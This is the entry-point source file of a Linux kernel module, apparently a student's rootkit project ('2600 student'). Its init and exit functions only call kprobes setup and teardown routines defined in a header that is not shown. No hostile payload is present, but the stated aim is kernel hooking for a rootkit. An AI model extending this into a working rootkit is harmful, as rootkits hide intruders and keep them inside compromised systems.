#include "rootest.h"

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("HOOOKING");
MODULE_AUTHOR("2600 student");

static int __init rootkit_init(void) 
{
    // kprobes concept
    return kprobes_init();
}

static void __exit rootkit_exit(void) 
{
    kprobes_exit();
}

module_init(rootkit_init);
module_exit(rootkit_exit);
